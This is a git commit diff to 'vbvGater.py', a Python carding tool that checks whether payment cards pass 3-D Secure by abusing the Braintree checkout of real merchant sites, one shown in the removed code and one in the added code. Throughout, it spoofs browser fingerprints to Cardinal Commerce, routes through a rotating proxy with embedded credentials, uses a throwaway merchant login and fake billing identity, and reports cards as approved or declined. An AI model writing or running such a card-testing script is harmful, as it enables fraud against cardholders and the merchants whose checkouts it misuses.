26e9e4f751c7677f9ca7b1eee45f9f9d4cfe2b9a
tmchek <pinanahima@gmail.com>
2025-04-10 18:42:02 -0400

    Update vbvGater.py

--- func/vbvGater.py
+++ func/vbvGater.py
@@ -1,156 +1,230 @@
-# vbvGater.py
-
-import base64
-import uuid
+import uuid,base64, json
 from requests import Session
+from retry import retry
 
-def CutQuery(text, Luno, Ldos):
-    return (text.split(Luno))[1].split(Ldos)[0]
 
-def VBV3D(cards):
-    try:
-        session = Session()
-        ccs = cards.split('|')
+class CutStr():
+    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
+        return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
 
-        headers1 = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
-        }
-        r1 = session.get('https://www.luminati.co.uk/my-account/payment-methods/', headers=headers1)
-        login_nonce = CutQuery(r1.text, ' name="woocommerce-login-nonce" value="', '"')
+def SaveResponseHhml(response:str):
+        with open("ResponseHhml.html", "w", encoding="utf-8") as f: f.write(response)
 
-        headers2 = {
-            'accept': '*/*',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.luminati.co.uk',
-            'referer': 'https://www.luminati.co.uk/my-account/payment-methods/',
-            'user-agent': headers1['user-agent']
-        }
-        data = {
-            'username': 'sohayeg260@movfull.com',
-            'password': 'yEDH27BG4f6Ad4a',
-            'woocommerce-login-nonce': login_nonce,
-            '_wp_http_referer': '/my-account/payment-methods/',
-            'login': 'Log in'
-        }
-        session.post('https://www.luminati.co.uk/my-account/payment-methods/', headers=headers2, data=data)
 
-        r2 = session.get('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers1)
-        nonce_add_payment = CutQuery(r2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
-        token_bear = CutQuery(r2.text, 'wc_braintree_client_token = ["', '"]')
+def DecodeBear(dato:str = None): return CutStr().QueryText(base64.b64decode(dato).decode('utf-8') , '"authorizationFingerprint":"','","')
+        
 
-        token_bear_final = base64.b64decode(token_bear).decode('utf-8')
-        authorizationFingerprint = CutQuery(token_bear_final, 'authorizationFingerprint":"', '"')
+class VbvGatereways:
+    @retry(tries=3)
+    def main(self,card):
+        try:
+            self.session = Session()
+            self.session.proxies.update({'http': 'http://syuwkzwr-rotate:9pazpqi70wld@p.webshare.io:80','https': 'http://syuwkzwr-rotate:9pazpqi70wld@p.webshare.io:80'})
+            self.uuid_client = str(uuid.uuid4())
+            
 
-        headers3 = {
-            'authorization': f'Bearer {authorizationFingerprint}',
-            'braintree-version': '2018-05-10',
-            'content-type': 'application/json',
-            'origin': 'https://assets.braintreegateway.com',
-            'referer': 'https://assets.braintreegateway.com/',
-            'user-agent': headers1['user-agent']
-        }
-
-        sessionId = str(uuid.uuid4())
-        json_data_tokenize = {
+            self.req_1 = self.session.get('https://www.masteringemacs.org/order')
+            tokenBear = CutStr().QueryText(self.req_1.text,'data-client-token="','"')
+            tokenbearfina = DecodeBear(tokenBear)
+            
+            
+            json_data = {
             'clientSdkMetadata': {
                 'source': 'client',
                 'integration': 'custom',
-                'sessionId': sessionId,
+                'sessionId': self.uuid_client,
             },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': ccs[0],
-                        'expirationMonth': ccs[1],
-                        'expirationYear': ccs[2],
-                        'cvv': ccs[3],
-                        'billingAddress': {
-                            'postalCode': '10010',
-                            'streetAddress': 'E Little York Rd 7912',
+            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
+            'operationName': 'ClientConfiguration',
+        }
+
+            self.req_2 = self.session.post('https://payments.braintree-api.com/graphql', headers= {'authority': 'payments.braintree-api.com','authorization': f'Bearer {tokenbearfina}','braintree-version': '2018-05-10'}, json=json_data)
+            
+            merchantId = CutStr().QueryText(self.req_2.text,'"merchantId":"','"')
+            cardinalAuthenticationJWT = CutStr().QueryText(self.req_2.text,'{"cardinalAuthenticationJWT":"','"')
+        
+            json_data = {
+                        'BrowserPayload': {
+                            'Order': {
+                                'OrderDetails': {},
+                                'Consumer': {
+                                    'BillingAddress': {},
+                                    'ShippingAddress': {},
+                                    'Account': {},
+                                },
+                                'Cart': [],
+                                'Token': {},
+                                'Authorization': {},
+                                'Options': {},
+                                'CCAExtension': {},
+                            },
+                            'SupportsAlternativePayments': {
+                                'cca': True,
+                                'hostedFields': False,
+                                'applepay': False,
+                                'discoverwallet': False,
+                                'wallet': False,
+                                'paypal': False,
+                                'visacheckout': False,
+                            },
                         },
-                    },
-                    'options': {
-                        'validate': False,
-                    },
+                        'Client': {
+                            'Agent': 'SongbirdJS',
+                            'Version': '1.35.0',
+                        },
+                        'ConsumerSessionId': None,
+                        'ServerJWT': cardinalAuthenticationJWT,
+                    }
+
+            self.req_3 = self.session.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', json=json_data)
+            bearer2 = CutStr().QueryText(self.req_3.text, '{"CardinalJWT":"', '"}')
+            partes = bearer2.split('.')
+            payload_codificado = partes[1]
+                    
+            ideference =  json.loads(base64.urlsafe_b64decode(payload_codificado + '=' * (4 - len(payload_codificado) % 4)))['ReferenceId']
+            
+            headers = {
+            'authority': 'geo.cardinalcommerce.com',
+            'origin': 'https://geo.cardinalcommerce.com',
+            'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8ab288adb1562e003d3637&tmEventType=PAYMENT&referenceId={ideference}&geolocation=false&origin=Songbird',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+            }
+
+            json_data = {
+                        'Cookies': {
+                            'Legacy': True,
+                            'LocalStorage': True,
+                            'SessionStorage': True,
+                        },
+                        'DeviceChannel': 'Browser',
+                        'Extended': {
+                            'Browser': {
+                                'Adblock': True,
+                                'AvailableJsFonts': [],
+                                'DoNotTrack': 'unknown',
+                                'JavaEnabled': False,
+                            },
+                            'Device': {
+                                'ColorDepth': 24,
+                                'Cpu': 'unknown',
+                                'Platform': 'Win32',
+                                'TouchSupport': {
+                                    'MaxTouchPoints': 0,
+                                    'OnTouchStartAvailable': False,
+                                    'TouchEventCreationSuccessful': False,
+                                },
+                            },
+                        },
+                        'Fingerprint': 'f9f30df37936982a8fe6d275f3e98441',
+                        'FingerprintingTime': 780,
+                        'FingerprintDetails': {
+                            'Version': '1.5.1',
+                        },
+                        'Language': 'en-US',
+                        'Latitude': None,
+                        'Longitude': None,
+                        'OrgUnitId': '5c8ab288adb1562e003d3637',
+                        'Origin': 'Songbird',
+                        'Plugins': [
+                            'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
+                            'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
+                            'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
+                            'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
+                            'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
+                        ],
+                        'ReferenceId': ideference,
+                        'Referrer': 'https://www.masteringemacs.org/',
+                        'Screen': {
+                            'FakedResolution': False,
+                            'Ratio': 1.7786458333333333,
+                            'Resolution': '1366x768',
+                            'UsableResolution': '1366x728',
+                            'CCAScreenSize': '02',
+                        },
+                        'CallSignEnabled': None,
+                        'ThreatMetrixEnabled': False,
+                        'ThreatMetrixEventType': 'PAYMENT',
+                        'ThreatMetrixAlias': 'Default',
+                        'TimeOffset': 300,
+                        'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+                        'UserAgentDetails': {
+                            'FakedOS': False,
+                            'FakedBrowser': False,
+                        },
+                        'BinSessionId': 'ce6b2cde-c82c-4291-9015-031e25b8c30a',
+                    }
+
+            self.session.post('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',headers=headers,json=json_data,)
+
+            ccs = card.split('|')
+            
+            json_data = {
+                        'clientSdkMetadata': {
+                            'source': 'client',
+                            'integration': 'dropin2',
+                            'sessionId': self.uuid_client,
+                        },
+                        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+                        'variables': {
+                            'input': {
+                                'creditCard': {
+                                    'number': ccs[0],
+                                    'expirationMonth': ccs[1],
+                                    'expirationYear': ccs[2],
+                                    'cvv': ccs[3],
+                                },
+                                'options': {
+                                    'validate': False,
+                                },
+                            },
+                        },
+                        'operationName': 'TokenizeCreditCard',
+                    }
+
+            self.req_4 = self.session.post('https://payments.braintree-api.com/graphql', headers={'authority': 'payments.braintree-api.com','authorization': f'Bearer {tokenbearfina}','braintree-version': '2018-05-10'}, json=json_data)
+            token_card = CutStr().QueryText(self.req_4.text, '{"token":"', '"')
+
+            json_data = {
+                'amount': '39.75',
+                'additionalInfo': {
+                    'acsWindowSize': '03',
                 },
-            },
-            'operationName': 'TokenizeCreditCard',
-        }
+                'bin': ccs[0][:6],
+                'dfReferenceId': ideference,
+                'clientMetadata': {
+                    'requestedThreeDSecureVersion': '2',
+                    'sdkVersion': 'web/3.85.2',
+                    'cardinalDeviceDataCollectionTimeElapsed': 236,
+                    'issuerDeviceDataCollectionTimeElapsed': 3628,
+                    'issuerDeviceDataCollectionResult': True,
+                },
+                'authorizationFingerprint': tokenbearfina,
+                'braintreeLibraryVersion': 'braintree/web/3.85.2',
+                '_meta': {
+                    'merchantAppId': 'www.masteringemacs.org',
+                    'platform': 'web',
+                    'sdkVersion': '3.85.2',
+                    'source': 'client',
+                    'integration': 'custom',
+                    'integrationType': 'custom',
+                    'sessionId': self.uuid_client,
+                },
+            }
 
-        r3 = session.post('https://payments.braintree-api.com/graphql', headers=headers3, json=json_data_tokenize)
-        token_card = r3.json()['data']['tokenizeCreditCard']['token']
+            response = self.session.post(f'https://api.braintreegateway.com/merchants/{merchantId}/client_api/v1/payment_methods/{token_card}/three_d_secure/lookup',json=json_data)
+            self.session.close()
+            
+            code = response.json()['paymentMethod']['threeDSecureInfo']['status']
+            
+            if "authenticate_successful" in code: return "True ✅",code
+            elif "authenticate_attempt_successful" in code: return "True! ✅",code
+            else: return "Not! ❌",code
+    
+        except: return "Not! ❌","error 3 Retry ( tries )" 
 
-        headers4 = {
-            'content-type': 'application/json',
-            'origin': 'https://www.luminati.co.uk',
-            'user-agent': headers1['user-agent']
-        }
 
-        json_data_lookup = {
-            'amount': '0.00',
-            'browserColorDepth': 24,
-            'browserJavaEnabled': False,
-            'browserJavascriptEnabled': True,
-            'browserLanguage': 'es-ES',
-            'browserScreenHeight': 1080,
-            'browserScreenWidth': 1920,
-            'browserTimeZone': 300,
-            'deviceChannel': 'Browser',
-            'additionalInfo': {
-                'ipAddress': '190.121.131.76',
-                'billingLine1': 'E Little York Rd 7912',
-                'billingLine2': '',
-                'billingCity': 'Norman',
-                'billingState': 'CA',
-                'billingPostalCode': '10010',
-                'billingCountryCode': 'US',
-                'billingPhoneNumber': '8194544131',
-                'billingGivenName': 'Lucas',
-                'billingSurname': 'Lorenzo',
-                'email': 'sohayeg260@movfull.com',
-            },
-            'challengeRequested': True,
-            'bin': ccs[0][0:6],
-            'dfReferenceId': str(uuid.uuid4()),
-            'clientMetadata': {
-                'requestedThreeDSecureVersion': '2',
-                'sdkVersion': 'web/3.106.0',
-                'cardinalDeviceDataCollectionTimeElapsed': 2760,
-                'issuerDeviceDataCollectionTimeElapsed': 3755,
-                'issuerDeviceDataCollectionResult': True,
-            },
-            'authorizationFingerprint': authorizationFingerprint,
-            'braintreeLibraryVersion': 'braintree/web/3.106.0',
-            '_meta': {
-                'merchantAppId': 'www.luminati.co.uk',
-                'platform': 'web',
-                'sdkVersion': '3.106.0',
-                'source': 'client',
-                'integration': 'custom',
-                'integrationType': 'custom',
-                'sessionId': sessionId,
-            },
-        }
+"""ccs = input("Enter the credit card CVV: ")
+chk = VbvGatereways().main(ccs)
+print(chk)"""
 
-        lookup_url = f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{token_card}/three_d_secure/lookup'
-        r4 = session.post(lookup_url, headers=headers4, json=json_data_lookup)
-        rjson = r4.json()
-
-        status = rjson['paymentMethod']['threeDSecureInfo']['status']
-        enrolled = rjson['paymentMethod']['threeDSecureInfo']['enrolled']
-
-        if 'authenticate_successful' in status or 'authenticate_attempt_successful' in status:
-            return 'Approved! ✅', f'{status} | {enrolled}'
-        else:
-            return 'Declined! ❌', f'{status} | {enrolled}'
-
-    except Exception as e:
-        return 'Declined! ❌', f'Error: {str(e)}'
-
-if __name__ == '__main__':
-    ccs = input('ccs: ')
-    result = VBV3D(ccs)
-    print(result)
 
